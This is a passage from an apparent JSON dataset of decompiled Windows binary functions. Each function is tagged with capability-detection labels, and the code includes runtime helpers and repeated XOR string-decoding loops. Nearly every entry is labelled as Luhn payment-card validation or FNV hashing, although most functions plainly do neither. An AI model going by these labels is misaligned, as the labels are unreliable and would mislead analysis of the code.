            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001d010(int64_t arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint uVar4;\n    uint64_t uVar5;\n    \n    iVar1 = *(arg1 + 0x14);\n    uVar5 = arg3;\n    iVar3 = 0;\n    do {\n        uVar2 = *(arg1 + 0x18 + iVar3 * 4) * arg2 + uVar5;\n        *(arg1 + 0x18 + iVar3 * 4) = uVar2;\n        iVar3 = iVar3 + 1;\n        uVar5 = uVar2 >> 0x20;\n    } while (iVar3 < iVar1);\n    iVar3 = arg1;\n    if (uVar5 != 0) {\n        uVar4 = uVar2 >> 0x20;\n        if (*(arg1 + 0xc) == iVar1 || *(arg1 + 0xc) < iVar1) {\n            iVar3 = fcn.14001ceb0(*(arg1 + 8) + 1);\n            if (iVar3 != 0) {\n                sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n                fcn.14001cfa0(arg1);\n                *(iVar3 + 0x18 + iVar1 * 4) = uVar4;\n                *(iVar3 + 0x14) = iVar1 + 1;\n            }\n        }\n        else {\n            *(arg1 + 0x18 + iVar1 * 4) = uVar4;\n            *(arg1 + 0x14) = iVar1 + 1;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 413
    },
    "14001db8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001db80(char **arg1, char *arg2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = *arg1;\n    do {\n        cVar1 = *arg2;\n        arg2 = arg2 + 1;\n        pcVar3 = pcVar3 + 1;\n        if (cVar1 == 0) {\n            *arg1 = pcVar3;\n            return 1;\n        }\n        iVar2 = *pcVar3;\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n    } while (iVar2 == cVar1);\n    return 0;\n}\n",
        "token_count": 170
    },
    "14001def": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001def0(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 60
    },
    "14001df1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001df10(uchar *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    uint *puVar2;\n    uint16_t auStackX16 [12];\n    int32_t aiStack12 [3];\n    \n    auStackX16[0] = noname_1;\n    if (arg3 == 0) {\n        if (0xff < noname_1) {\ncode_r0x00014001df84:\n            puVar2 = sub.msvcrt.dll__errno();\n            *puVar2 = 0x2a;\n            return 0xffffffff;\n        }\n        *arg1 = noname_1;\n        uVar1 = 1;\n    }\n    else {\n        aiStack12[0] = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(arg3, 0, auStackX16, 1, arg1, arg4, 0, aiStack12);\n        if ((uVar1 == 0) || (aiStack12[0] != 0)) goto code_r0x00014001df84;\n    }\n    return uVar1;\n}\n",
        "token_count": 267
    },
    "14001e24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14001e240(ushort *arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg4_00;\n    ushort uStack42;\n    \n    uStack42 = 0;\n    if (arg1 == NULL) {\n        arg1 = &uStack42;\n    }\n    sub.msvcrt.dll____mb_cur_max_func();\n    sub.msvcrt.dll____lc_codepage_func();\n    arg4_00 = 0x140136d68;\n    if (arg4 != 0) {\n        arg4_00 = arg4;\n    }\n    iVar1 = fcn.14001e0e0(arg1, arg2, arg3, arg4_00);\n    return iVar1;\n}\n",
        "token_count": 175
    },
    "14001e7f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e7f0(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x32) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x33; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x33; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "14001e8e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e8e0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x35) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x36; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x36; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 345
    },
    "14001e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001e9c0(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x35) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x36; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x36; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "14001eab": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001eab0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x36) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x37; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x37; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 344
    },
    "14001eb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001eb90(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x38) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x39; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x39; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "14001ec7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001ec70(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x3a) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x3b; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x3b; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 346
    },
    "14001ed5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001ed50(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x40) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x41; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x41; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 374
    },
    "14001ee4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001ee40(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x43) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x44; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x44; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "14001ef2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001ef20(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x48) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x49; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x49; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "14001f00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001f000(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x49) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x4a; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x4a; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 376
    },
    "14001f0f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001f0f0(int64_t arg1, int64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    int32_t iStack68;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    if (*(arg1 + 0x4b) != '\\0') {\n        for (iStack68 = 0; arg2 = arg1,  iStack68 < 0x4c; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2, arg3, arg4);\n    fcn.140001530(0x14010a5e8, arg2, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x4c; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 348
    },
    "14001f1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nulong fcn.14001f1d0(uint64_t arg1, uint64_t arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg2_00;\n    ulong var_28h;\n    int32_t iStack68;\n    ulong var_28h_2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_4h;\n    \n    arg2_00 = arg2;\n    if (*(arg1 + 0x4f) != '\\0') {\n        for (iStack68 = 0; arg2_00 = arg1,  iStack68 < 0x50; iStack68 = iStack68 + 1) {\n            arg3 = *(arg1 + iStack68);\n            *(arg1 + iStack68) = *(arg1 + iStack68) ^ iStack68 + (iStack68 / 0x36) * -0x36 + 0x34U;\n        }\n    }\n    fcn.140001530(arg1, arg2_00, arg3, arg4);\n    fcn.140001530(\"0x%x\\n\", arg2 & 0xffffffff, arg3, arg4);\n    for (var_18h._4_4_ = 0; var_18h._4_4_ < 0x50; var_18h._4_4_ = var_18h._4_4_ + 1) {\n        *(arg1 + var_18h._4_4_) = 0;\n    }\n    return 0;\n}\n",
        "token_count": 377
    },
    "14001fee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.14001fee0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x1401068a0 == '\\0') {\n        iVar1 = fcn.1400bcbc0(0x1401068a0);\n        if (iVar1 != 0) {\n            if (**0x14010fc90 != 0) {\n                fcn.140014930(0x140109360);\n            }\n            fcn.1400014f0(0x1400bcf60);\n            fcn.1400bccc0(0x1401068a0);\n            return 0x140109360;\n        }\n    }\n    return 0x140109360;\n}\n",
        "token_count": 155
    },
    "14001fff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t ** fcn.14001fff0(int64_t arg1)\n\n{\n    int32_t iVar1;\n    int64_t **in_RAX;\n    int64_t **ppiVar2;\n    int64_t **ppiVar3;\n    int64_t *piVar4;\n    uint32_t uVar5;\n    int64_t **ppiVar6;\n    int64_t **ppiVar7;\n    uint64_t **ppuVar8;\n    int32_t *piVar9;\n    uint64_t *puVar10;\n    uint64_t uVar11;\n    int64_t **ppiVar12;\n    \n    iVar1 = **0x14010fc90;\n    piVar9 = *0x14010fc90;\n    if (iVar1 != 0) goto code_r0x0001400200b8;\n    piVar9 = *(arg1 + -0x10);\n    if (*0x140106bb0 == NULL) {\n        *(arg1 + -8) = 0;\n        *0x140106bb0 = arg1 + -0x10;\n        return in_RAX;\n    }\n    do {\n        ppiVar3 = arg1 + -0x10;\n        ppiVar6 = ppiVar3 + piVar9;\n        if (ppiVar6 < *0x140106bb0) goto code_r0x0001400200e3;\n        in_RAX = (*0x140106bb0)[1];\n        if (ppiVar6 == *0x140106bb0) {\n            piVar9 = piVar9 + **0x140106bb0;\n            *(arg1 + -8) = in_RAX;\n            *(arg1 + -0x10) = piVar9;\n            *0x140106bb0 = ppiVar3;\n        }\n        else {\n            ppiVar12 = 0x140106bb0;\n            ppiVar7 = *0x140106bb0;\n            if (in_RAX != NULL) {\n                do {\n                    ppiVar2 = in_RAX;\n                    if (ppiVar2 <= ppiVar6) {\n                        if (ppiVar6 == ppiVar2) {\n                            piVar9 = piVar9 + *ppiVar6;\n                            ppiVar7[1] = ppiVar6[1];\n                        }\n                        break;\n                    }\n                    ppiVar12 = ppiVar7 + 1;\n                    in_RAX = ppiVar2[1];\n                    ppiVar7 = ppiVar2;\n                } while (ppiVar2[1] != NULL);\n                ppiVar7 = *ppiVar12;\n            }\n            if (ppiVar3 == ppiVar7 + *ppiVar7) {\n                in_RAX = *ppiVar7 + piVar9;\n                *ppiVar7 = in_RAX;\n            }\n            else {\n                piVar4 = ppiVar7[1];\n                *(arg1 + -0x10) = piVar9;\n                *(arg1 + -8) = piVar4;\n                in_RAX = *ppiVar12;\n                in_RAX[1] = ppiVar3;\n            }\n        }\n        while( true ) {\n            if ((iVar1 == 0) || (in_RAX = fcn.1400149e0(0x140106ba0),  in_RAX == 0)) {\n                return in_RAX;\n            }\n            fcn.140021df0();\ncode_r0x0001400200b8:\n            ppiVar6 = 0x140106ba0;\n            in_RAX = fcn.140014970(0x140106ba0);\n            if (in_RAX != 0) {\n                fcn.140021dc0();\n                piVar9 = *0x14010fc90;\n                iVar1 = **0x14010fc90;\n                if (iVar1 != 0) goto code_r0x000140020210;\n                ppiVar3 = ppiVar6 + 2;\n                if (ppiVar3 < 0x10) {\n                    ppiVar3 = 0x10;\n                }\n                if (*0x140106bb0 == NULL) {\n                    return NULL;\n                }\n                goto code_r0x00014002018e;\n            }\n            iVar1 = *piVar9;\n            piVar9 = *(arg1 + -0x10);\n            if (*0x140106bb0 != NULL) break;\ncode_r0x0001400200e3:\n            *(arg1 + -8) = *0x140106bb0;\n            *0x140106bb0 = arg1 + -0x10;\n        }\n    } while( true );\ncode_r0x00014002018e:\n    piVar4 = ppiVar3 + 0xfU & 0xfffffffffffffff0;\n    ppuVar8 = 0x140106bb0;\n    ppiVar6 = *0x140106bb0;\n    do {\n        if (piVar4 <= *ppiVar6) {\n            uVar11 = *ppiVar6 - piVar4;\n            if (uVar11 < 0x10) {\n                *ppiVar6 = *ppiVar6;\n                puVar10 = ppiVar6[1];\n            }\n            else {\n                puVar10 = ppiVar6 + piVar4;\n                puVar10[1] = ppiVar6[1];\n                ppiVar6 = *ppuVar8;\n                *puVar10 = uVar11;\n                *ppiVar6 = piVar4;\n            }\n            *ppuVar8 = puVar10;\n            ppiVar6 = ppiVar6 + 2;\n            break;\n        }\n        ppuVar8 = ppiVar6 + 1;\n        ppiVar6 = ppiVar6[1];\n    } while (ppiVar6 != NULL);\n    do {\n        if ((iVar1 == 0) || (iVar1 = fcn.1400149e0(0x140106ba0),  iVar1 == 0)) {\n            return ppiVar6;\n        }\n        fcn.140021df0();\ncode_r0x000140020210:\n        uVar5 = 0x40106ba0;\n        iVar1 = fcn.140014970(0x140106ba0);\n        if (iVar1 != 0) {\n            fcn.140021dc0();\n            switch(uVar5 & 0x7d) {\n            default:\n                return NULL;\n            case 1:\n            case 0x11:\n                return 0x14010de38;\n            case 5:\n            case 0x15:\n                return 0x14010de59;\n            case 8:\n                return 0x14010de3e;\n            case 9:\n            case 0x19:\n                return 0x14010de4a;\n            case 0xc:\n                return 0x14010de35;\n            case 0xd:\n            case 0x1d:\n                return 0x14010de3a;\n            case 0x10:\n            case 0x30:\n                return 0x14010de30;\n            case 0x14:\n            case 0x34:\n                return 0x14010de52;\n            case 0x18:\n                return 0x14010de40;\n            case 0x1c:\n                return 0x14010de5c;\n            case 0x38:\n                return 0x14010de43;\n            case 0x3c:\n                return 0x14010de60;\n            case 0x50:\n            case 0x70:\n                return 0x14010de32;\n            case 0x54:\n                return 0x14010de55;\n            case 0x78:\n                return 0x14010de46;\n            case 0x7c:\n                return \"w+bx\";\n            }\n        }\n        ppiVar3 = ppiVar6 + 2;\n        iVar1 = *piVar9;\n        if (ppiVar3 < 0x10) {\n            ppiVar3 = 0x10;\n        }\n        ppiVar6 = *0x140106bb0;\n    } while (*0x140106bb0 == NULL);\n    goto code_r0x00014002018e;\n}\n",
        "token_count": 1830
    },
    "14002026": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.140020260(ulong arg1)\n\n{\n    if ((arg1 & 0x7d) < 0x7d) {\n    // switch table (125 cases) at 0x14010de64\n        switch(*((arg1 & 0x7d) * 4 + 0x14010de64) + 0x14010de64) {\n        case 0x140020288:\n            return 0x14010de38;\n        case 0x140020290:\n            return 0x14010de59;\n        case 0x1400202a0:\n            return 0x14010de4a;\n        case 0x1400202b0:\n            return 0x14010de3a;\n        case 0x1400202c0:\n            return 0x14010de52;\n        case 0x1400202c8:\n            return 0x14010de35;\n        case 0x1400202d0:\n            return 0x14010de40;\n        case 0x1400202d8:\n            return 0x14010de5c;\n        case 0x1400202e0:\n            return 0x14010de43;\n        case 0x1400202e8:\n            return 0x14010de60;\n        case 0x1400202f0:\n            return 0x14010de46;\n        case 0x1400202f8:\n            return \"w+bx\";\n        case 0x140020300:\n            return 0x14010de55;\n        case 0x140020308:\n            return 0x14010de3e;\n        case 0x140020310:\n            return 0x14010de32;\n        case 0x140020320:\n            return 0x14010de30;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 421
    },
    "14002040": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140020400(ulong *arg1)\n\n{\n    int32_t iVar1;\n    ulong *arg1_00;\n    int64_t arg1_01;\n    int64_t iVar2;\n    \n    if (**0x14010fc90 != 0) {\n        iVar1 = fcn.1400149e0(*arg1);\n        if (iVar1 != 0) {\n            arg1_00 = fcn.1400bc7f0(8);\n            iVar2 = 0x140111900;\n            *arg1_00 = 0x140116340;\n            arg1_01 = fcn.1400bcdb0(arg1_00, 0x140111900, 0x140021a60);\n            if (iVar2 == -1) {\n                fcn.1400bc920(arg1_01);\n            }\n            fcn.140014f30(arg1_01);\n            sub.msvcrt.dll__fileno_1(*(arg1_01 + 0x50));\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "140081eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140081eb0(ulong *arg1)\n\n{\n    sub.msvcrt.dll__fileno_1(*arg1);\n    return;\n}\n",
        "token_count": 35
    },
    "1400204a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400204a0(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    \n    fcn.14008b4f0(arg1);\n    *arg1 = 0x1401160e0;\n    fcn.140082180(arg1 + 10, arg2);\n    cVar2 = fcn.140027090(arg1 + 10);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    *(arg1 + 0xc) = arg3;\n    arg1[0xf] = arg4;\n    fcn.140089750(arg1);\n    uVar1 = arg1[0xe];\n    arg1[6] = 0;\n    *(arg1 + 0x81) = 0;\n    arg1[3] = uVar1;\n    arg1[1] = uVar1;\n    arg1[2] = uVar1;\n    *(arg1 + 4) = 0x0;\n    return;\n}\n",
        "token_count": 238
    },
    "1400208d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
